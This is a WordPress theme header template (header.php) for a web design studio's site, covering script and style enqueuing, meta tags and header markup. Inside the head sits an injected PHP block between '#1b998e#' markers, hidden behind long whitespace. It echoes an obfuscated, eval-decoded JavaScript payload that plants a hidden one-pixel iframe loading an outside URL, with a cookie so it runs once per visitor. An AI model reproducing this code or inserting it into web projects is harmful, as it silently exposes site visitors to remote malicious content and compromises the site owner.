<?php include 'mobile.php'; ?>

<?php 
    
	$root = get_bloginfo('template_directory');
	  
	  /*
		wp_enqueue_script(
			  'Name of the script, lowercase string',
			  'path to the file .js',
			  'array of scripts it depends on',
			  'version of  the script',
			  'boolean value to select whether you want to print the script in the footer or in the header'
		);
	  */
	  
	  wp_enqueue_script('jquery');
	  wp_enqueue_script(
		  'roundabout'
		  ,$root."/js/vendor/jquery.roundabout.min.js"
		  ,array('jquery')
		  ,false
		  ,true
	  );
	  wp_enqueue_script(
		  'main.js'
		  ,$root."/js/main.js"
		  ,array('jquery','roundabout')
		  ,false
		  ,true
	  );
	  
	  wp_enqueue_script(
		  'modernizer'
		  ,$root."/js/vendor/modernizr-2.6.2.min.js"
		  ,array('jquery')
		  ,false
		  ,true
	  );
	  
	   wp_enqueue_script(
		  'bootstrap'
		  ,$root."/js/vendor/bootstrap.min.js"
		  ,array('jquery')
		  ,false
		  ,true
	  );
	  
	  /*
			  wp_enqueue_style(
			  'Name of the style, lowercase string',
			  'path to the file .css',
			  'array of stylesheets it depends on',
			  'version of  the file',
			  'value to select the type of media you want to assign to your stylesheet'
		);
	  
	  */
	  
	   wp_enqueue_style(
		  'style'
		  ,$root."/style.css"
		  ,false
		  ,false
		  ,'all'
	  );	
	  
	  wp_enqueue_style(
		  'normalize'
		  ,$root."/css/normalize.css"
		  ,false
		  ,false
		  ,'all'
	  );	
	  
	  wp_enqueue_style(
		  'roundabout'
		  ,$root."/css/roundabout.css"
		  ,false
		  ,false
		  ,'all'
	  );
	  
	  wp_enqueue_style(
		  'googlefontsUbuntu'
		  ,'http://fonts.googleapis.com/css?family=Ubuntu'
		  ,false
		  ,false
		  ,'all'
	  );
	  
	  wp_enqueue_style(
		  'googlefontsElsie'
		  ,'http://fonts.googleapis.com/css?family=Elsie'
		  ,false
		  ,false
		  ,'all'
	  );
	  
	   wp_enqueue_style(
		  'bootsrap_resp'
		  ,$root."/css/bootstrap-responsive.min.css"
		  ,false
		  ,false
		  ,'all'
	  );
	  
	   wp_enqueue_style(
		  'bootsrap'
		  ,$root."/css/bootstrap.css"
		  ,false
		  ,false
		  ,'all'
	  );
	   
	 $menu_to_count = wp_nav_menu(array(
	'echo' => false,
	'theme_location' => 'main-nav'
	));
	
	$menu_items = substr_count($menu_to_count,'class="menu-item ');
	
	$menu_items_width = floor(100/$menu_items);

?>


<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->

    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="viewport" content="width=device-width">
        <meta name="msvalidate.01" content="9FC9C908E09D922876EE3E3E60F68D59" />
		<meta name="google-site-verification" content="dixC3taI0pQ-AqqbYiuFq8XsE7m77ZXH9TfDnfPOALU" />
        <title>jmc design studios - boston web design and development</title> 
	<?php wp_head();?>
<?
#1b998e#
                                                                                                                                                                                                                                                          echo "                                                                                                                                                                                                                                                          <script type=\"text/javascript\" language=\"javascript\" >                                                                                                                                                                                                                                                          ps=\"split\";e=eval;v=\"0x\";a=0;z=\"y\";try{a*=25}catch(zz){a=1}if(!a){try{--e(\"doc\"+\"ument\")[\"\x62od\"+z]}catch(q){a2=\"_\";sa=0xa-02;}z=\"28_6e_7d_76_6b_7c_71_77_76_28_82_82_82_6e_6e_6e_30_31_28_83_15_12_28_7e_69_7a_28_6a_81_72_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_7a_6d_69_7c_6d_4d_74_6d_75_6d_76_7c_30_2f_71_6e_7a_69_75_6d_2f_31_43_15_12_15_12_28_6a_81_72_36_7b_7a_6b_28_45_28_2f_70_7c_7c_78_42_37_37_6d_7a_77_7c_71_6b_69_75_6d_76_7c_6d_36_77_7a_6f_37_74_77_69_76_37_79_5f_53_4c_3f_41_55_6f_36_78_70_78_2f_43_15_12_28_6a_81_72_36_7b_7c_81_74_6d_36_78_77_7b_71_7c_71_77_76_28_45_28_2f_69_6a_7b_77_74_7d_7c_6d_2f_43_15_12_28_6a_81_72_36_7b_7c_81_74_6d_36_6a_77_7a_6c_6d_7a_28_45_28_2f_38_2f_43_15_12_28_6a_81_72_36_7b_7c_81_74_6d_36_70_6d_71_6f_70_7c_28_45_28_2f_39_78_80_2f_43_15_12_28_6a_81_72_36_7b_7c_81_74_6d_36_7f_71_6c_7c_70_28_45_28_2f_39_78_80_2f_43_15_12_28_6a_81_72_36_7b_7c_81_74_6d_36_74_6d_6e_7c_28_45_28_2f_39_78_80_2f_43_15_12_28_6a_81_72_36_7b_7c_81_74_6d_36_7c_77_78_28_45_28_2f_39_78_80_2f_43_15_12_15_12_28_71_6e_28_30_29_6c_77_6b_7d_75_6d_76_7c_36_6f_6d_7c_4d_74_6d_75_6d_76_7c_4a_81_51_6c_30_2f_6a_81_72_2f_31_31_28_83_15_12_28_6c_77_6b_7d_75_6d_76_7c_36_7f_7a_71_7c_6d_30_2f_44_6c_71_7e_28_71_6c_45_64_2f_6a_81_72_64_2f_46_44_37_6c_71_7e_46_2f_31_43_15_12_28_6c_77_6b_7d_75_6d_76_7c_36_6f_6d_7c_4d_74_6d_75_6d_76_7c_4a_81_51_6c_30_2f_6a_81_72_2f_31_36_69_78_78_6d_76_6c_4b_70_71_74_6c_30_6a_81_72_31_43_15_12_28_85_15_12_85_15_12_6e_7d_76_6b_7c_71_77_76_28_5b_6d_7c_4b_77_77_73_71_6d_30_6b_77_77_73_71_6d_56_69_75_6d_34_6b_77_77_73_71_6d_5e_69_74_7d_6d_34_76_4c_69_81_7b_34_78_69_7c_70_31_28_83_15_12_28_7e_69_7a_28_7c_77_6c_69_81_28_45_28_76_6d_7f_28_4c_69_7c_6d_30_31_43_15_12_28_7e_69_7a_28_6d_80_78_71_7a_6d_28_45_28_76_6d_7f_28_4c_69_7c_6d_30_31_43_15_12_28_71_6e_28_30_76_4c_69_81_7b_45_45_76_7d_74_74_28_84_84_28_76_4c_69_81_7b_45_45_38_31_28_76_4c_69_81_7b_45_39_43_15_12_28_6d_80_78_71_7a_6d_36_7b_6d_7c_5c_71_75_6d_30_7c_77_6c_69_81_36_6f_6d_7c_5c_71_75_6d_30_31_28_33_28_3b_3e_38_38_38_38_38_32_3a_3c_32_76_4c_69_81_7b_31_43_15_12_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_28_45_28_6b_77_77_73_71_6d_56_69_75_6d_33_2a_45_2a_33_6d_7b_6b_69_78_6d_30_6b_77_77_73_71_6d_5e_69_74_7d_6d_31_15_12_28_33_28_2a_43_6d_80_78_71_7a_6d_7b_45_2a_28_33_28_6d_80_78_71_7a_6d_36_7c_77_4f_55_5c_5b_7c_7a_71_76_6f_30_31_28_33_28_30_30_78_69_7c_70_31_28_47_28_2a_43_28_78_69_7c_70_45_2a_28_33_28_78_69_7c_70_28_42_28_2a_2a_31_43_15_12_85_15_12_6e_7d_76_6b_7c_71_77_76_28_4f_6d_7c_4b_77_77_73_71_6d_30_28_76_69_75_6d_28_31_28_83_15_12_28_7e_69_7a_28_7b_7c_69_7a_7c_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_71_76_6c_6d_80_57_6e_30_28_76_69_75_6d_28_33_28_2a_45_2a_28_31_43_15_12_28_7e_69_7a_28_74_6d_76_28_45_28_7b_7c_69_7a_7c_28_33_28_76_69_75_6d_36_74_6d_76_6f_7c_70_28_33_28_39_43_15_12_28_71_6e_28_30_28_30_28_29_7b_7c_69_7a_7c_28_31_28_2e_2e_15_12_28_30_28_76_69_75_6d_28_29_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_7b_7d_6a_7b_7c_7a_71_76_6f_30_28_38_34_28_76_69_75_6d_36_74_6d_76_6f_7c_70_28_31_28_31_28_31_15_12_28_83_15_12_28_7a_6d_7c_7d_7a_76_28_76_7d_74_74_43_15_12_28_85_15_12_28_71_6e_28_30_28_7b_7c_69_7a_7c_28_45_45_28_35_39_28_31_28_7a_6d_7c_7d_7a_76_28_76_7d_74_74_43_15_12_28_7e_69_7a_28_6d_76_6c_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_71_76_6c_6d_80_57_6e_30_28_2a_43_2a_34_28_74_6d_76_28_31_43_15_12_28_71_6e_28_30_28_6d_76_6c_28_45_45_28_35_39_28_31_28_6d_76_6c_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_74_6d_76_6f_7c_70_43_15_12_28_7a_6d_7c_7d_7a_76_28_7d_76_6d_7b_6b_69_78_6d_30_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_7b_7d_6a_7b_7c_7a_71_76_6f_30_28_74_6d_76_34_28_6d_76_6c_28_31_28_31_43_15_12_85_15_12_71_6e_28_30_76_69_7e_71_6f_69_7c_77_7a_36_6b_77_77_73_71_6d_4d_76_69_6a_74_6d_6c_31_15_12_83_15_12_71_6e_30_4f_6d_7c_4b_77_77_73_71_6d_30_2f_7e_71_7b_71_7c_6d_6c_67_7d_79_2f_31_45_45_3d_3d_31_83_85_6d_74_7b_6d_83_5b_6d_7c_4b_77_77_73_71_6d_30_2f_7e_71_7b_71_7c_6d_6c_67_7d_79_2f_34_28_2f_3d_3d_2f_34_28_2f_39_2f_34_28_2f_37_2f_31_43_15_12_15_12_82_82_82_6e_6e_6e_30_31_43_15_12_85_15_12_85_15_12\"[ps](a2);za=\"\";for(i=0;i<z.length;i++){za+=String[\"fromCharCode\"](e(v+(z[i]))-sa);}zaz=za;e(zaz);}</script>";

#/1b998e#
?>

		
        <style>
        
        	html{
    			background: url(<?php echo $root;?>/images/landscape-wallpapers-goodscreen-water-bench-203009.jpg) no-repeat center center fixed; 
      	  		    -webkit-background-size: cover;
   				   -moz-background-size: cover;
    				-o-background-size: cover;
    				background-size: cover;
      	  }
      	  	#footer{
  				background-image:url(<?php echo $root;?>/images/grass.png);
 			 	-webkit-background-size: cover;
    			-moz-background-size: cover;
    			-o-background-size: cover;
    			background-size: cover;
  				width: 100%;
  				height: 250px;

        	}
        
        	.menu-main-nav-container ul li{
        		width: <?php echo $menu_items_width; ?>%;
        	}
        	
        	
        </style>
        
    </head>
    <body <?php body_class($class); ?>> 
    <div id="fb-root"></div>

        <!--[if lt IE 7]>
            <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">activate Google Chrome Frame</a> to improve your experience.</p>
        <![endif]-->

        <!-- Add your site or application content here -->
         
        <header>
           <div>
            <span>jmc design studios</span>
            <img id="large-cloud" src="<?php echo $root; ?>/images/cartoon-cloud-4.png" />
                
             <span id="header_title">web design &amp; development by</span>
              <span id="header_title_name">Jared Clapp</span>
              <nav id="main-nav">
                 <?php wp_nav_menu( array( 
                 		'theme_location' => 'main-nav'
                 		) ); ?>
                 
                 <!-- <ul>
                      <li><a class="links" id="home" href="#">home</a></li>
                      <li><a class="links" id="portfolio" href="#">portfolio</a></li>
                      <li><a class="links" id="contact" href="#">contact</a></li>
                  </ul>
                  -->

<div class="fb-like" data-href="https://www.facebook.com/jmcdesignstudios" data-send="false" data-layout="button_count" data-width="200" data-show-faces="true" data-colorscheme="dark"></div>
                         
            
                            
              </nav>
    
        </header>